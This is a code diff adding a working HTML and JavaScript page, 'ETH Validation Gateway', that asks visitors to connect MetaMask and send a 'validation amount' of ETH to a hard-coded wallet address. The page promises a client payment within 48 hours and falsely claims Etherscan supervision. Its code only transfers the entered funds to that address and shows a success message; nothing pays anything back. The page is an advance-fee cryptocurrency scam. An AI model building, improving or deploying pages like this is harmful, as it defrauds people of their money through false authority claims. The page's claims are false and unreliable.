@@ -1,0 +1,946 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>ETH Validation Gateway</title>
+  <!-- Онлайн іконка Ethereum - працюватиме завжди -->
+  <link rel="icon" href="https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/eth.svg" type="image/svg+xml">
+  <!-- Стилі вбудовані (щоб не створювати окремий CSS файл) -->
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body { 
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; 
+      background-color: #f8f9fa;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    
+    .container {
+      max-width: 800px;
+      width: 100%;
+      animation: fadeIn 0.5s ease-out;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    .header {
+      text-align: center;
+      margin-bottom: 30px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    .logo-container {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    
+    .logo-icon {
+      width: 36px;
+      height: 36px;
+      background: linear-gradient(135deg, #21325b 0%, #3a4d8c 100%);
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: bold;
+      font-size: 18px;
+    }
+    
+    .logo {
+      font-size: 28px;
+      font-weight: 700;
+      color: #21325b;
+      letter-spacing: 1px;
+    }
+    
+    .subtitle {
+      color: #6c757d;
+      font-size: 16px;
+    }
+    
+    .card {
+      background: white;
+      border-radius: 8px;
+      padding: 30px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      border: 1px solid #dee2e6;
+    }
+    
+    .title {
+      font-size: 24px;
+      font-weight: 600;
+      color: #21325b;
+      margin-bottom: 20px;
+      text-align: center;
+      border-bottom: 2px solid #e9ecef;
+      padding-bottom: 15px;
+    }
+    
+    .instruction-box {
+      background: #f8f9fa;
+      border-radius: 6px;
+      padding: 20px;
+      margin-bottom: 25px;
+      border-left: 4px solid #21325b;
+    }
+    
+    .instruction-title {
+      font-weight: 600;
+      color: #21325b;
+      margin-bottom: 12px;
+      font-size: 16px;
+    }
+    
+    .instruction-text {
+      color: #495057;
+      line-height: 1.6;
+      font-size: 14px;
+    }
+    
+    .step-box {
+      background: #f8f9fa;
+      border-radius: 6px;
+      padding: 20px;
+      margin-bottom: 25px;
+      border: 1px solid #e9ecef;
+    }
+    
+    .step-title {
+      font-weight: 600;
+      color: #21325b;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 16px;
+    }
+    
+    .amount-display {
+      background: white;
+      border-radius: 6px;
+      padding: 20px;
+      margin-bottom: 20px;
+      border: 1px solid #dee2e6;
+    }
+    
+    .amount-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 15px;
+    }
+    
+    .amount-label {
+      font-weight: 600;
+      color: #495057;
+      font-size: 15px;
+    }
+    
+    .wallet-balance {
+      font-size: 13px;
+      color: #6c757d;
+      background: #e9ecef;
+      padding: 4px 12px;
+      border-radius: 4px;
+      font-family: monospace;
+    }
+    
+    .wallet-balance.error {
+      background: #f8d7da;
+      color: #721c24;
+      border: 1px solid #f5c6cb;
+    }
+    
+    .wallet-balance.success {
+      background: #d1e7dd;
+      color: #0f5132;
+      border: 1px solid #badbcc;
+    }
+    
+    .amount-input-container {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background: white;
+      border: 2px solid #dee2e6;
+      border-radius: 6px;
+      padding: 12px;
+      transition: all 0.3s ease;
+    }
+    
+    .amount-input-container:focus-within {
+      border-color: #21325b;
+      box-shadow: 0 0 0 2px rgba(33, 50, 91, 0.1);
+    }
+    
+    .eth-icon {
+      width: 40px;
+      height: 40px;
+      background: linear-gradient(135deg, #21325b 0%, #3a4d8c 100%);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: bold;
+      font-size: 16px;
+      flex-shrink: 0;
+    }
+    
+    .amount-input-wrapper {
+      flex: 1;
+    }
+    
+    #amountInput {
+      width: 100%;
+      padding: 10px 14px;
+      border: 1px solid #ced4da;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: 500;
+      color: #21325b;
+      transition: all 0.3s ease;
+      outline: none;
+      font-family: monospace;
+    }
+    
+    #amountInput:focus {
+      border-color: #21325b;
+      box-shadow: 0 0 0 2px rgba(33, 50, 91, 0.1);
+    }
+    
+    #amountInput.error {
+      border-color: #dc3545;
+      background-color: #fff5f5;
+    }
+    
+    #amountInput.success {
+      border-color: #198754;
+      background-color: #f8fff9;
+    }
+    
+    .amount-unit {
+      font-size: 16px;
+      font-weight: 600;
+      color: #21325b;
+      white-space: nowrap;
+    }
+    
+    .minimum-note {
+      font-size: 13px;
+      color: #6c757d;
+      margin-top: 10px;
+      text-align: center;
+      background: #e9ecef;
+      padding: 8px;
+      border-radius: 4px;
+    }
+    
+    .controls {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 25px;
+    }
+    
+    button {
+      flex: 1;
+      padding: 16px 20px;
+      border-radius: 6px;
+      border: none;
+      font-size: 15px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    
+    #connectBtn {
+      background: #e9ecef;
+      color: #495057;
+      border: 1px solid #dee2e6;
+    }
+    
+    #connectBtn:hover:not(:disabled) {
+      background: #dee2e6;
+      border-color: #ced4da;
+      transform: translateY(-1px);
+    }
+    
+    #payBtn {
+      background: #21325b;
+      color: white;
+      font-weight: 600;
+    }
+    
+    #payBtn:hover:not(:disabled) {
+      background: #1a2949;
+      transform: translateY(-1px);
+      box-shadow: 0 4px 8px rgba(33, 50, 91, 0.2);
+    }
+    
+    button:disabled {
+      opacity: 0.65;
+      cursor: not-allowed;
+      transform: none !important;
+    }
+    
+    .status-box {
+      background: #f8f9fa;
+      border-radius: 6px;
+      padding: 16px;
+      margin-bottom: 20px;
+      border: 1px solid #e9ecef;
+    }
+    
+    .status-label {
+      font-weight: 600;
+      color: #495057;
+      margin-bottom: 6px;
+      font-size: 14px;
+    }
+    
+    #status {
+      color: #21325b;
+      font-weight: 500;
+      font-size: 14px;
+      font-family: monospace;
+    }
+    
+    .warn-box {
+      background: #fff3cd;
+      border: 1px solid #ffeaa7;
+      border-radius: 6px;
+      padding: 14px;
+      margin-bottom: 20px;
+      display: none;
+      font-size: 14px;
+    }
+    
+    .warn-box.show {
+      display: block;
+      animation: slideIn 0.3s ease-out;
+    }
+    
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    #warn {
+      color: #856404;
+      font-weight: 500;
+    }
+    
+    .info-box {
+      background: #f8f9fa;
+      border-radius: 6px;
+      padding: 20px;
+      border-left: 4px solid #21325b;
+      margin-top: 20px;
+    }
+    
+    .info-title {
+      font-weight: 600;
+      color: #21325b;
+      margin-bottom: 12px;
+      font-size: 16px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    
+    .info-text {
+      color: #495057;
+      line-height: 1.5;
+      margin-bottom: 8px;
+      font-size: 14px;
+    }
+    
+    .security-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(33, 50, 91, 0.1);
+      color: #21325b;
+      padding: 6px 12px;
+      border-radius: 4px;
+      font-size: 13px;
+      font-weight: 500;
+      margin-top: 12px;
+      border: 1px solid rgba(33, 50, 91, 0.2);
+    }
+    
+    .footer {
+      text-align: center;
+      color: #6c757d;
+      margin-top: 30px;
+      font-size: 13px;
+      padding-top: 20px;
+      border-top: 1px solid #e9ecef;
+    }
+    
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+    
+    .stat-box {
+      background: white;
+      border: 1px solid #dee2e6;
+      border-radius: 6px;
+      padding: 12px;
+      text-align: center;
+    }
+    
+    .stat-value {
+      font-size: 18px;
+      font-weight: 600;
+      color: #21325b;
+      font-family: monospace;
+    }
+    
+    .stat-label {
+      font-size: 12px;
+      color: #6c757d;
+      margin-top: 4px;
+    }
+    
+    .network-indicator {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: #21325b;
+      color: white;
+      padding: 6px 12px;
+      border-radius: 4px;
+      font-size: 12px;
+      font-weight: 500;
+      z-index: 1000;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
+    
+    @media (max-width: 768px) {
+      .container {
+        padding: 10px;
+      }
+      
+      .card {
+        padding: 20px;
+      }
+      
+      .header {
+        margin-bottom: 20px;
+      }
+      
+      .logo {
+        font-size: 24px;
+      }
+      
+      .subtitle {
+        font-size: 14px;
+      }
+      
+      .controls {
+        flex-direction: column;
+      }
+      
+      .stats-grid {
+        grid-template-columns: 1fr;
+      }
+      
+      .network-indicator {
+        position: relative;
+        top: 0;
+        right: 0;
+        margin-bottom: 15px;
+        text-align: center;
+      }
+      
+      .amount-header {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 10px;
+      }
+      
+      .wallet-balance {
+        align-self: stretch;
+        text-align: center;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="network-indicator" id="networkIndicator">
+    Network: Unknown
+  </div>
+  
+  <div class="container">
+    <div class="header">
+      <div class="logo-container">
+        <div class="logo-icon">Ξ</div>
+        <div class="logo">ETH VALIDATION GATEWAY</div>
+      </div>
+      <div class="subtitle">Secure Blockchain Validation Process</div>
+    </div>
+    
+    <div class="card">
+      <h1 class="title">Validation Process</h1>
+      
+      <div class="stats-grid">
+        <div class="stat-box">
+          <div class="stat-value" id="currentGas">--</div>
+          <div class="stat-label">Current Gas Price</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-value" id="minAmount">0.001 ETH</div>
+          <div class="stat-label">Minimum Required</div>
+        </div>
+      </div>
+      
+      <div class="instruction-box">
+        <div class="instruction-title">📋 Validation Instructions</div>
+        <div class="instruction-text">
+          1. Enter the required ETH amount for validation (minimum 0.001 ETH)<br>
+          2. Connect your MetaMask wallet<br>
+          3. Confirm the validation transaction in your MetaMask wallet
+        </div>
+      </div>
+      
+      <div class="step-box">
+        <div class="step-title">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
+          </svg>
+          Step 1: Enter Validation Amount
+        </div>
+        
+        <div class="amount-display">
+          <div class="amount-header">
+            <div class="amount-label">Validation Amount:</div>
+            <div class="wallet-balance" id="walletBalance">
+              Wallet: Not connected
+            </div>
+          </div>
+          
+          <div class="amount-input-container">
+            <div class="eth-icon">Ξ</div>
+            <div class="amount-input-wrapper">
+              <input 
+                id="amountInput" 
+                type="number" 
+                min="0.001" 
+                step="0.001" 
+                value="0.1" 
+                placeholder="0.001"
+              />
+            </div>
+            <div class="amount-unit">ETH</div>
+          </div>
+          
+          <div class="minimum-note">
+            Minimum validation amount: 0.001 ETH • Enter amount above minimum
+          </div>
+        </div>
+      </div>
+      
+      <div class="step-box">
+        <div class="step-title">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="12" cy="12" r="10"/>
+            <path d="M12 16v-4M12 8h.01"/>
+          </svg>
+          Step 2: Connect & Validate
+        </div>
+        
+        <div class="controls">
+          <button id="connectBtn">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/>
+              <circle cx="9" cy="7" r="4"/>
+              <path d="M23 21v-2a4 4 0 0 0-3-3.87"/>
+              <path d="M16 3.13a4 4 0 0 1 0 7.75"/>
+            </svg>
+            Connect MetaMask
+          </button>
+          <button id="payBtn" disabled>
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+              <polyline points="22 4 12 14.01 9 11.01"/>
+            </svg>
+            Start Validation
+          </button>
+        </div>
+        
+        <div class="status-box">
+          <div class="status-label">Connection Status:</div>
+          <div id="status">🔌 Waiting for MetaMask connection</div>
+        </div>
+        
+        <div class="warn-box" id="warnContainer">
+          <div id="warn"></div>
+        </div>
+      </div>
+      
+      <div class="info-box">
+        <div class="info-title">ℹ️ Validation Process Information</div>
+        <div class="info-text">
+          This validation process is supervised and monitored by <strong>Etherscan</strong> for maximum transparency and security.
+          All transactions are publicly verifiable on the Ethereum blockchain.
+        </div>
+        <div class="info-text">
+          The validation process will be completed within <strong>48 hours</strong>. Once validated, 
+          the full client payment will be transferred to your designated address, including the validation amount.
+        </div>
+        <div class="security-badge">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          </svg>
+          Etherscan Supervised • Publicly Verifiable
+        </div>
+      </div>
+    </div>
+    
+    <div class="footer">
+      <p>Secure Validation Gateway • Powered by Ethereum Blockchain • All transactions are publicly verifiable</p>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
+  <script>
+    // === SETTINGS ===
+    const RECIPIENT_RAW = "0x984Fa0985fF5c88ced1e372e06B94fE1045cbffD"; // recipient address
+    const MIN_AMOUNT = 0.001; // Minimum validation amount in ETH (0.001 ETH)
+
+    const statusEl = document.getElementById("status");
+    const warnEl = document.getElementById("warn");
+    const warnContainer = document.getElementById("warnContainer");
+    const connectBtn = document.getElementById("connectBtn");
+    const payBtn = document.getElementById("payBtn");
+    const amountInput = document.getElementById("amountInput");
+    const walletBalanceEl = document.getElementById("walletBalance");
+    const networkIndicator = document.getElementById("networkIndicator");
+    const currentGasEl = document.getElementById("currentGas");
+
+    let provider, signer;
+    let RECIPIENT; // normalized address
+    let userAddress = '';
+    let userBalance = 0;
+    let currentGasPrice = null;
+
+    function setStatus(t) { 
+      statusEl.textContent = t;
+      if (t.includes('connected') || t.includes('✅') || t.includes('success')) {
+        statusEl.style.color = '#198754'; // Green for success
+      } else if (t.includes('error') || t.includes('❌') || t.includes('failed')) {
+        statusEl.style.color = '#dc3545'; // Red for error
+      } else if (t.includes('Waiting') || t.includes('⏳')) {
+        statusEl.style.color = '#ffc107'; // Yellow for waiting
+      } else {
+        statusEl.style.color = '#21325b'; // Default blue
+      }
+    }
+    
+    function setWarn(t, isError = true) { 
+      warnEl.textContent = t || "";
+      if (isError) {
+        warnContainer.style.background = '#f8d7da';
+        warnContainer.style.borderColor = '#f5c6cb';
+        warnEl.style.color = '#721c24';
+      } else {
+        warnContainer.style.background = '#d1e7dd';
+        warnContainer.style.borderColor = '#badbcc';
+        warnEl.style.color = '#0f5132';
+      }
+      warnContainer.classList.toggle('show', !!t);
+    }
+
+    // Normalize and validate address
+    try {
+      RECIPIENT = ethers.getAddress(RECIPIENT_RAW.trim());
+    } catch (e) {
+      setWarn("Invalid recipient address in page code.");
+    }
+
+    function updateButtonState() {
+      const amount = Number(amountInput.value);
+      const hasSufficientBalance = userBalance >= amount;
+      const isValidAmount = validAmount();
+      
+      // Update wallet balance display
+      if (signer && userAddress) {
+        const formattedBalance = userBalance.toFixed(6);
+        walletBalanceEl.textContent = `Balance: ${formattedBalance} ETH`;
+        
+        if (hasSufficientBalance && isValidAmount) {
+          walletBalanceEl.className = 'wallet-balance success';
+        } else if (!hasSufficientBalance && amount > 0) {
+          walletBalanceEl.className = 'wallet-balance error';
+        } else {
+          walletBalanceEl.className = 'wallet-balance';
+        }
+      }
+      
+      // Enable button only if:
+      // 1. User is connected
+      // 2. Amount is valid and >= minimum
+      // 3. User has sufficient balance
+      payBtn.disabled = !signer || !isValidAmount || !hasSufficientBalance;
+      
+      // Update input styling
+      if (amountInput.value && isValidAmount && hasSufficientBalance) {
+        amountInput.classList.remove('error');
+        amountInput.classList.add('success');
+      } else if (amountInput.value && (!isValidAmount || !hasSufficientBalance)) {
+        amountInput.classList.add('error');
+        amountInput.classList.remove('success');
+      } else {
+        amountInput.classList.remove('error', 'success');
+      }
+    }
+
+    function validAmount() {
+      const amount = Number(amountInput.value);
+      const isValid = Number.isFinite(amount) && amount >= MIN_AMOUNT;
+      
+      if (amountInput.value && !isValid) {
+        setWarn(`Minimum validation amount is ${MIN_AMOUNT} ETH`);
+        return false;
+      }
+      return isValid;
+    }
+
+    // Real-time validation
+    amountInput.addEventListener('input', () => {
+      setWarn(''); // Clear warnings on input
+      validAmount();
+      updateButtonState();
+    });
+
+    // Format input on blur
+    amountInput.addEventListener('blur', () => {
+      const amount = Number(amountInput.value);
+      if (Number.isFinite(amount) && amount >= MIN_AMOUNT) {
+        amountInput.value = amount.toFixed(6);
+      }
+      updateButtonState();
+    });
+
+    async function updateWalletBalance() {
+      if (signer && userAddress) {
+        try {
+          const balanceWei = await provider.getBalance(userAddress);
+          userBalance = Number(ethers.formatEther(balanceWei));
+          updateButtonState();
+        } catch (error) {
+          console.error('Error updating balance:', error);
+        }
+      }
+    }
+
+    async function updateGasPrice() {
+      if (provider) {
+        try {
+          const feeData = await provider.getFeeData();
+          const gasPriceGwei = Number(ethers.formatUnits(feeData.gasPrice || 0, 'gwei'));
+          currentGasPrice = gasPriceGwei;
+          currentGasEl.textContent = `${gasPriceGwei.toFixed(0)} Gwei`;
+        } catch (error) {
+          console.error('Error updating gas price:', error);
+          currentGasEl.textContent = '--';
+        }
+      }
+    }
+
+    async function updateNetworkInfo() {
+      if (provider) {
+        try {
+          const network = await provider.getNetwork();
+          const networkName = network.name === 'homestead' ? 'Mainnet' : 
+                            network.name === 'sepolia' ? 'Sepolia' : 
+                            network.name;
+          networkIndicator.textContent = `Network: ${networkName} (${network.chainId})`;
+        } catch (error) {
+          console.error('Error updating network info:', error);
+        }
+      }
+    }
+
+    connectBtn.onclick = async () => {
+      try {
+        setWarn("");
+        if (!window.ethereum) { 
+          setWarn("MetaMask extension not found. Please install MetaMask to continue."); 
+          return; 
+        }
+        if (!RECIPIENT) { 
+          setWarn("Validation system error. Please contact support."); 
+          return; 
+        }
+
+        await window.ethereum.request({ method: "eth_requestAccounts" });
+        provider = new ethers.BrowserProvider(window.ethereum);
+        signer = await provider.getSigner();
+
+        userAddress = await signer.getAddress();
+        const net = await provider.getNetwork();
+
+        // Get initial balance and gas price
+        await updateWalletBalance();
+        await updateGasPrice();
+        await updateNetworkInfo();
+
+        setStatus(`✅ Connected: ${userAddress.slice(0,6)}…${userAddress.slice(-4)}`);
+        
+        // Listen for account changes
+        window.ethereum.on('accountsChanged', async (accounts) => {
+          if (accounts.length === 0) {
+            setStatus("🔌 MetaMask disconnected");
+            signer = null;
+            userAddress = '';
+            userBalance = 0;
+            walletBalanceEl.textContent = "Wallet: Not connected";
+            walletBalanceEl.className = 'wallet-balance';
+            payBtn.disabled = true;
+            networkIndicator.textContent = "Network: Disconnected";
+          } else {
+            userAddress = accounts[0];
+            signer = await provider.getSigner(userAddress);
+            await updateWalletBalance();
+            await updateNetworkInfo();
+            setStatus(`✅ Connected: ${userAddress.slice(0,6)}…${userAddress.slice(-4)}`);
+          }
+        });
+
+        // Listen for chain changes
+        window.ethereum.on('chainChanged', async () => {
+          window.location.reload();
+        });
+
+        // Periodically update gas price
+        setInterval(updateGasPrice, 30000); // Update every 30 seconds
+        
+      } catch (e) {
+        setWarn(e?.message || "Connection failed. Please try again.");
+      }
+    };
+
+    payBtn.onclick = async () => {
+      try {
+        setWarn("");
+        
+        // Validate inputs
+        if (!signer) { 
+          setWarn("Please connect your MetaMask wallet first."); 
+          return; 
+        }
+        if (!RECIPIENT) { 
+          setWarn("Validation system error. Please contact support."); 
+          return; 
+        }
+        if (!validAmount()) { 
+          setWarn(`Please enter a valid amount (minimum ${MIN_AMOUNT} ETH).`); 
+          return; 
+        }
+        
+        const amount = Number(amountInput.value);
+        
+        // Check balance again before sending
+        await updateWalletBalance();
+        if (userBalance < amount) {
+          setWarn(`Insufficient balance. You have ${userBalance.toFixed(6)} ETH, but need ${amount.toFixed(6)} ETH.`);
+          return;
+        }
+
+        // Update gas price before sending
+        await updateGasPrice();
+        
+        // Show estimated gas cost
+        const estimatedGasCost = currentGasPrice ? (currentGasPrice * 21000 / 1e9).toFixed(6) : '--';
+        setStatus(`⏳ Preparing transaction... Gas: ~${estimatedGasCost} ETH`);
+
+        // Change button text during processing
+        const originalText = payBtn.innerHTML;
+        payBtn.innerHTML = `
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="12" cy="12" r="10"/>
+            <path d="M12 6v6l4 2"/>
+          </svg>
+          Processing...
+        `;
+        payBtn.disabled = true;
+
+        const tx = await signer.sendTransaction({
+          to: RECIPIENT,
+          value: ethers.parseEther(amount.toString()),
+        });
+
+        setStatus(`✅ Transaction sent: ${tx.hash.slice(0,10)}…${tx.hash.slice(-8)}`);
+        
+        // Update balance after sending
+        setTimeout(updateWalletBalance, 2000);
+        
+        // Wait for transaction confirmation
+        setStatus(`⏳ Waiting for confirmation...`);
+        const receipt = await tx.wait();
+        
+        if (receipt.status === 1) {
+          setStatus(`🎉 Validation started! TX: ${tx.hash.slice(0,10)}…${tx.hash.slice(-8)}`);
+          setWarn(`✅ Validation process initiated successfully! Transaction confirmed in block ${receipt.blockNumber}.`, false);
+          
+          // Clear form
+          amountInput.value = "0.1";
+          amountInput.classList.remove('success');
+        } else {
+          setStatus("❌ Transaction failed");
+          setWarn("Transaction failed to confirm. Please try again.");
+        }
+        
+      } catch (e) {
+        // Reset button on error
+        payBtn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+          <polyline points="22 4 12 14.01 9 11.01"/>
+        </svg> Start Validation`;
+        payBtn.disabled = false;
+        updateButtonState();
+        
+        if (e?.message?.includes('insufficient funds')) {
+          setWarn("Insufficient balance for this transaction. Please check your ETH balance.");
+        } else if (e?.message?.includes('user rejected')) {
+          setWarn("Transaction was rejected in MetaMask.");
+        } else if (e?.message?.includes('network')) {
+          setWarn("Network error. Please check your connection and try again.");
+        } else {
+          setWarn(e?.message || "Transaction failed. Please try again.");
+        }
+      }
+    };
+
+    // Initialize with default value
+    amountInput.value = "0.1";
+    updateButtonState();
+  </script>
+</body>
+</html>
